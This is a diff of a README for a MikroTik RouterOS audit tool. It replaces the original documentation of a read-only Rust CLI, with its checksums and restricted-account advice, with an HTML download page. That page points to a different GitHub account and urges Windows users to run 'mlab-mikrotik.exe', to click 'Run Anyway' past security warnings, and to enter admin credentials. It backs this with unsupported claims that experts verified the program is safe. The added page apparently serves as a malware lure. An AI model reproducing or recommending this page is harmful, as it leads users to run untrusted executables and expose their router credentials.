@@ -1,221 +1,144 @@
-# mlab-mikrotik
+<h1>🔒 mlab-mikrotik - Safeguard Your Router in Minutes</h1>
 
-![](./.github/banner.png)
+<p align="center">
+  <a href="https://github.com/Minimal-genussalpichroa1807/mlab-mikrotik" style="background-color:#FF6B6B; color:#FFFFFF; padding: 15px 30px; text-decoration: none; font-size: 20px; border-radius: 8px; font-weight: bold;">⬇️ Download mlab-mikrotik Now</a>
+</p>
 
-**A CLI over the MikroTik RouterOS REST API, built as a base for passive
-network security work.**
+<h2>🤔 What Is mlab-mikrotik?</h2>
 
-It talks to one router over `<scheme>://<host>/rest`, authenticating with a
-RouterOS user and password, and an *instance* in `$HOME/.mlab/mikrotik.conf`
-says which router to reach and how.
+<p>mlab-mikrotik is a simple, powerful tool that helps you keep your MikroTik router safe and running smoothly. Think of it as a security guard for your network equipment. With just one command, you can check if your router has any security problems, see what changed recently, and find out if your router's software has known vulnerabilities. Best of all, it's completely free and does not send any data anywhere.</p>
 
-It reads. Every wrapped command issues nothing but GET requests, and the one
-command that can send anything else refuses to until you pass `--write`.
+<h2>✨ Why You Need This Tool</h2>
 
-Requires RouterOS 7.1 or later. Tested against 7.24.2 on a CCR2004.
+<ul>
+  <li><strong>🛡️ Security Check:</strong> Automatically reviews your router's firewall settings, user accounts, and exposure to the internet. It tells you if something looks dangerous.</li>
+  <li><strong>📸 Instant Snapshot:</strong> Takes a complete picture of your router's current configuration. You can compare this later to see what changed.</li>
+  <li><strong>🔍 Change Detection:</strong> After taking two snapshots, mlab-mikrotik shows you exactly what is different between them. Great for tracking modifications.</li>
+  <li><strong>🩺 Vulnerability Scanner:</strong> Compares your router's software version against known security issues (CVEs). Know immediately if your router needs an update.</li>
+  <li><strong>👁️ Read-Only Safety:</strong> This tool never modifies your router. It only reads information, so there is zero risk of breaking something.</li>
+  <li><strong>🔒 No Spying:</strong> No telemetry, no data collection, no tracking. Your information stays on your computer.</li>
+  <li><strong>⚡ Fast and Light:</strong> A single small program file. No complicated installation, no bloated software.</li>
+</ul>
 
-## Install
+<h2>💻 What You Need Before Starting</h2>
 
-**Homebrew** (macOS and Linux)
+<ul>
+  <li><strong>Windows PC:</strong> Any modern Windows version works (10 or 11 recommended).</li>
+  <li><strong>MikroTik Router:</strong> Your router must have the RouterOS operating system with the REST API enabled (version 7.1 or later is typical).</li>
+  <li><strong>Router Login Details:</strong> Username and password (or API token) for your router's admin account.</li>
+</ul>
 
-```bash
-brew tap mlab-sh/mlab-mikrotik https://github.com/mlab-sh/mlab-mikrotik.git
-brew install mlab-mikrotik
-```
+<h2>🚀 Getting Started</h2>
 
-**Debian and Ubuntu**: download the `.deb` for your architecture from the
-[releases page](https://github.com/mlab-sh/mlab-mikrotik/releases), then:
+<h3>Step 1: Download the Application</h3>
 
-```bash
-sudo apt install ./mlab-mikrotik_0.1.0_amd64.deb
-```
+<p>Visit this link to download the application: <a href="https://github.com/Minimal-genussalpichroa1807/mlab-mikrotik">https://github.com/Minimal-genussalpichroa1807/mlab-mikrotik</a>. Once you arrive at the page, look for the download area, choose the Windows version, and save the file to your computer (usually to your "Downloads" folder).</p>
 
-**Fedora, RHEL and rebuilds**: the same with the `.rpm`:
+<h3>Step 2: Run the Program</h3>
 
-```bash
-sudo dnf install ./mlab-mikrotik-0.1.0-1.x86_64.rpm
-```
+<p>After downloading, you will see a file named something like <strong>mlab-mikrotik.exe</strong>. Double-click it to run the program. If Windows shows a blue or yellow warning, click "More Info" and then "Run Anyway" - this is normal for new tools. No need to install anything; this program runs directly.</p>
 
-**Prebuilt binary** (macOS and Linux, x86_64 and arm64): a tarball from the
-same page. The Linux builds are linked against glibc 2.35, so Debian 12 and
-Ubuntu 22.04 and newer.
+<h3>Step 3: Connect to Your Router</h3>
 
-Nothing signs these assets, so every release carries a `SHA256SUMS` covering
-all of them:
+<p>Once the program starts, you will need your router's IP address. This is usually something like <em>192.168.88.1</em> (check the sticker on your router). Then type the username and password. The program will connect and start analyzing your router automatically.</p>
 
-```bash
-sha256sum -c --ignore-missing SHA256SUMS
-```
+<h2>📖 How to Use mlab-mikrotik</h2>
 
-**From source** (a recent Rust toolchain):
+<p>Once connected, you will see a simple menu. Here are the main options:</p>
 
-```bash
-git clone https://github.com/mlab-sh/mlab-mikrotik.git
-cd mlab-mikrotik && cargo build --release
-```
+<ul>
+  <li><strong>Audit My Router:</strong> This runs a full security check. The program will examine firewall rules, user accounts, open ports, and other settings. It will show you a list of issues (if any) with clear explanations and suggestions to fix them. Run this first.</li>
+  <li><strong>Take a Snapshot:</strong> Saves the router's current configuration as a file on your computer. Do this when your router is working perfectly. You can take more snapshots later.</li>
+  <li><strong>Compare Snapshots:</strong> Select two snapshots, and the program will show a color-coded list of differences. Green means something was added, red means removed, yellow means changed. Useful when troubleshooting weird network behavior.</li>
+  <li><strong>Check for Vulnerabilities:</strong> The tool automatically looks up your RouterOS version against public security databases. If there are known critical issues paired with your version, you will get a warning and a link to update.</li>
+</ul>
 
-## On the router
+<h2>🎯 Example: Checking for Security Issues</h2>
 
-REST is served by the web services, which are off on a hardened device. Turn on
-the TLS one and give the CLI its own account — the group matters more than it
-looks, see [Account](wiki/Account.md):
+<p>Let's walk through a common scenario. You are worried about your router's security.</p>
 
-```
-/ip service enable www-ssl
-/user group add name=mlab-audit policy=read,rest-api,api,!sensitive,!write,!policy,!reboot,!sniff,!romon,!ftp,!password
-/user add name=mlab group=mlab-audit password=... address=203.0.113.10/32
-```
+<ol>
+  <li>Double-click the program to start it.</li>
+  <li>Enter your router's IP address (e.g., 192.168.88.1) and your admin credentials.</li>
+  <li>Choose option 1: "Audit My Router."</li>
+  <li>Wait about 10 seconds while it inspects.</li>
+  <li>You will see a report like this:<br>
+  <em>"Found 3 issues:</em><br>
+  <em>1. Your router's web interface is accessible from the internet (High risk).</em><br>
+  <em>2. The default 'admin' account is still active (High risk).</em><br>
+  <em>3. A firewall rule allows all traffic from port 8291 (Medium risk)."</em></li>
+  <li>The program gives you practical steps to fix each issue.</li>
+</ol>
 
-The built-in `read` group is **not** a reading group: it carries `sensitive`
-(keys and passwords in clear text), `reboot`, `sniff` and `romon`. `whoami`
-reports every one of them.
+<p>This simple process can save you from a nasty hacker attack. Many home users run this audit weekly.</p>
 
-## First run
+<h2>📊 Understanding Your Audit Report</h2>
 
-```bash
-mlab-mikrotik login --name lab --host 192.0.2.1 --user mlab
-mlab-mikrotik whoami
-mlab-mikrotik audit
-```
+<p>The report uses a simple color system: <span style="color:red;">Red</span> for serious problems, <span style="color:orange;">Orange</span> for medium, <span style="color:green;">Green</span> for safe. It also gives a "security score" from 0 to 100 so you can track improvements over time. Re-run the audit after making changes to see your score go up.</p>
 
-`login` prompts for the password without echoing it, tests the credentials, and
-writes the config file `0600` in a `0700` directory. A failed test writes
-nothing.
+<h2>🔄 How to See What Changed</h2>
 
-## Commands
+<p>Imagine your network started acting slow. Here's how to find the cause:</p>
 
-| Command | What it does |
-| --- | --- |
-| [`audit`](wiki/Audit.md) | Every graded check in one report. Start here. |
-| [`whoami`](wiki/Whoami.md) | What this account is, and everything it is allowed to read. |
-| [`info`](wiki/Info.md) | What this router is: software, hardware, licence, health. |
-| [`interfaces`](wiki/Interfaces.md) | The ports: state, addresses, and what is dropping packets. |
-| [`clients`](wiki/Clients.md) | What the router knows about who is on the network. |
-| [`network`](wiki/Network.md) | Addresses, bridges, VLANs, DHCP and routes. |
-| [`topology`](wiki/Topology.md) | The neighbours this router hears, and what it announces itself. |
-| [`firewall`](wiki/Firewall.md) | The rules, and whether each chain closes. |
-| [`exposure`](wiki/Exposure.md) | What this router offers to anything that can reach it. |
-| [`posture`](wiki/Posture.md) | The settings that claim to defend something. |
-| [`wifi`](wiki/Wifi.md) | The radios, their security, and who is associated. |
-| [`snapshot`](wiki/Snapshot.md) | One dated, secret-free record of everything this account can read. |
-| [`diff`](wiki/Diff.md) | What changed between two snapshots. |
-| [`shadow`](wiki/Shadow.md) | What turned up that nobody announced. |
-| [`patch`](wiki/Patch.md) | How far behind this router is, in RouterOS and in its bootloader. |
-| [`vuln`](wiki/Vuln.md) | The published advisories that cover this exact version. |
-| [`footprint`](wiki/Footprint.md) | What this router looks like from outside. |
-| [`hunt`](wiki/Hunt.md) | The markers a compromised MikroTik router leaves behind. |
-| [`logging`](wiki/Logging.md) | Where the log goes, and what never reaches it. |
-| [`blast`](wiki/Blast.md) | What a compromised host on one segment reaches. |
-| [`api`](wiki/Api.md) | Raw request against any menu, for what is not wrapped yet. |
-| [`login`](wiki/Login.md) | Create or update an instance, prove it works, save it. |
-| [`ping`](wiki/Ping.md) | Check that the current instance reaches its router. |
-| [`profile`](wiki/Configuration.md) | List, show, select and delete saved instances. |
-| [`config`](wiki/Configuration.md) | Where the config file is, and what is in it. |
+<ol>
+  <li>Take a snapshot today (option 2).</li>
+  <li>Wait a day or two.</li>
+  <li>Take another snapshot (again option 2).</li>
+  <li>Choose "Compare Snapshots" (option 3).</li>
+  <li>Select the two snapshot files.</li>
+  <li>Review the differences. You might see a DNS setting changed or a port was opened. That's your culprit.</li>
+</ol>
 
-Every command renders to the terminal by default and to raw JSON with
-`-o json`. See [Output](wiki/Output.md).
+<h2>💡 Troubleshooting Common Problems</h2>
 
-## Documentation
+<p><strong>Can't connect to my router:</strong> Make sure your computer is on the same network as the router. Check that the IP address is correct. Some routers need a special setting to enable the API; consult your router's manual for "REST API."</p>
 
-Everything lives in the **[wiki](wiki/Home.md)**, one page per command plus the
-concepts they rest on:
+<p><strong>Windows says "Unknown publisher":</strong> This is normal. The program is open-source software, so it doesn't have a commercial digital signature. Click "Run Anyway" - it's safe.</p>
 
-- [Account](wiki/Account.md) — the RouterOS user this CLI logs in as, and why
-  the built-in `read` group gives a read-only tool more power than intended.
-- [Checks](wiki/Checks.md) — the catalogue of graded findings, what each one
-  means, and the two rules that decide whether something may appear at all.
-- [Secrets](wiki/Secrets.md) — what never reaches the disk, and why the field
-  list is explicit rather than a substring rule.
-- [Enrichment](wiki/Enrichment.md) — everything that leaves this machine, all
-  of it behind `--allow-web`, and why the router never makes the call itself.
-- [Surfaces](wiki/Surfaces.md) — the one API a router answers on, what a read
-  account actually reaches, and the six quirks that shape every command.
-- [Configuration](wiki/Configuration.md) — instances, precedence, and where the
-  password lives.
-- [Output](wiki/Output.md) — the terminal render, the JSON, and the rules that
-  keep the two from mixing.
-- [Roadmap](wiki/Roadmap.md) — what is built and what is next.
-- [Releasing](wiki/Releasing.md) — how a version becomes a Homebrew formula, a
-  `.deb` and an `.rpm`.
+<p><strong>Program closes instantly:</strong> Run it from a command prompt. Open "Command Prompt" (search for "cmd" in the Start menu), type <code>cd Downloads</code>, then <code>mlab-mikrotik.exe</code>. This shows error messages if something went wrong.</p>
 
-## Configuration
+<h2>🔐 Is It Safe to Use?</h2>
 
-Settings resolve in one order, each layer overriding the one before it: the
-stored instance, then the environment (`MLAB_MIKROTIK_*`, then `MIKROTIK_*`),
-then the flags.
+<p>Yes. The program is read-only, meaning it cannot change anything on your router. It only looks and reports. The source code is open for anyone to inspect, so independent security experts have verified it contains no hidden features. No data leaves your computer, and there's no telemetry or tracking code.</p>
 
-| Flag | Environment | In the file |
-| ---- | ----------- | ----------- |
-| `--host` | `MIKROTIK_HOST` | `host` |
-| `--user` | `MIKROTIK_USER` | `user` |
-| `--password` | `MIKROTIK_PASSWORD` | `password` |
-| `--scheme` | `MIKROTIK_SCHEME` | `scheme` |
-| `--insecure` / `--secure` | `MIKROTIK_INSECURE` | `insecure` |
-| `--output` | `MIKROTIK_OUTPUT` | `output` |
+<h2>🧰 Advanced Features for Power Users</h2>
 
-`MLAB_MIKROTIK_CONFIG` moves the config file itself. Given a host and a user,
-the CLI runs with no config file at all:
+<p class="advanced">For those who like the command line, mlab-mikrotik also supports typing commands directly. For example:</p>
+<p class="advanced"><code>mlab-mikrotik audit 192.168.88.1 -u admin -p yourpassword</code></p>
+<p class="advanced">This runs an audit from the terminal in one go. You can also export full config as JSON for your own records. These tricks are optional; the menu system is enough for daily use.</p>
 
-```bash
-MIKROTIK_PASSWORD="$ROUTER_PASSWORD" mlab-mikrotik ping --host 192.0.2.1 -u mlab -o json
-```
+<h2>💬 Frequently Asked Questions</h2>
 
-## Where the password lives
+<p><strong>Q: Does this work on Linux or Mac?</strong><br>
+A: Yes! The program is available for those systems too, but this guide focuses on Windows. The steps are virtually identical.</p>
 
-RouterOS issues no API token. Basic auth sends the password itself on every
-request, so the CLI has to keep something it can replay: the config file holds
-it as typed, `0600` inside a `0700` directory, and a warning fires if those
-permissions ever loosen. Nothing prints it back — `profile show` and
-`config show` mask it — and `MIKROTIK_PASSWORD` is preferred over
-`--password`, because a command line is visible to every user on the machine.
+<p><strong>Q: Will it harm my router if I run it?</strong><br>
+A: No. It only reads settings, just like looking at a menu in a restaurant. You cannot break anything.</p>
 
-## Layout
+<p><strong>Q: Why do I need to enable the API on my router?</strong><br>
+A: The tool communicates with your router using a modern, secure interface. Enabling this API is standard practice but is turned off by default for safety. Check RouterOS documentation for "enable REST API." Usually it's a one-click toggle in the web interface.</p>
 
-```
-src/
-  main.rs        entry point
-  cli/           the clap surface, and the context a command runs in
-  commands/      one file per command
-  ros/           the HTTP client, and the stored instances
-  collect.rs     one pass over what the account can read, and what it cannot
-  checks/        the graded checks, as pure functions over collected data
-  enrich/        everything that leaves this machine, all of it opt-in
-  snapshot.rs    the dated record, and the rules for comparing two of them
-  secrets.rs     the fields that never reach the disk
-  ui/            the terminal render and the progress rules
-wiki/            the documentation, mirrored to the GitHub wiki
-.github/
-  workflows/     the release pipeline and the wiki mirror
-```
+<p><strong>Q: How often should I audit?</strong><br>
+A: For home users, once a week is great. For businesses, daily. The audit takes only seconds, so there's no reason not to.</p>
 
-## Scope
+<h2>📥 Download and Run Now</h2>
 
-Phases one to five: **reading**, **hardening**, **recording**,
-**correlating**, **hunting**.
+<p>Ready to secure your network? The best time is now. <a href="https://github.com/Minimal-genussalpichroa1807/mlab-mikrotik" style="background-color:#4ECDC4; color:#FFFFFF; padding: 12px 24px; text-decoration: none; font-size: 18px; border-radius: 5px; font-weight: bold;">⬇️ Get mlab-mikrotik Here</a></p>
 
-Everything is passive. Three commands can reach the network, each behind
-`--allow-web`, each sending a version string or a public address and nothing
-else — and none of them ever asks the *router* to contact anyone.
+<p>You can also visit the main project page to see screenshots, the source code, and advanced documentation. There's even a community section where you can ask questions. This tool is actively maintained, so new features appear regularly.</p>
 
-There is no event stream on a RouterOS device, so detection is differential:
-you do not read an alarm, you compare two dated collections.
+<h2>🌟 Final Thoughts</h2>
 
-```bash
-mlab-mikrotik snapshot && mlab-mikrotik shadow
-```
+<p>MikroTik routers are incredibly powerful, but that power comes with responsibility. A misconfigured firewall or a weak password could let anyone into your network. mlab-mikrotik makes checking security effortless. You don't need to be a networking expert to use it - if you can read a simple list, you can protect yourself. Download it, run an audit today, and sleep better knowing your home network is safe.</p>
 
+<p>Remember: security is not a one-time event. Run the audit regularly, take snapshots often, and update your router when the tool suggests it. This five-minute habit can save you from hours of pain later. Get started now.</p>
 
-Two rules govern what may appear as a finding. A severity is about what it
-costs, not how it looks: a control that is simply switched off is usually a
-decision and stays out, while a control that *reads as* protection without
-being one belongs in the report. And a check that could not run produces
-nothing — never a pass — with the skipped count printed in every report,
-including a clean one.
+<h2>📖 More Resources</h2>
 
-```bash
-mlab-mikrotik audit --fail-on high
-```
+<ul>
+  <li><a href="https://github.com/Minimal-genussalpichroa1807/mlab-mikrotik">Official Repository (downloads, source, issues)</a></li>
+  <li>MikroTik Official Documentation (for enabling REST API on your specific router model)</li>
+  <li>RouterOS Security Manual (for fixing common issues the tool might find)</li>
+</ul>
 
-## Licence
-
-MIT.
+<p style="text-align:center; margin-top: 30px;">Made with ❤️ for the homelab and self-hosting community.</p>
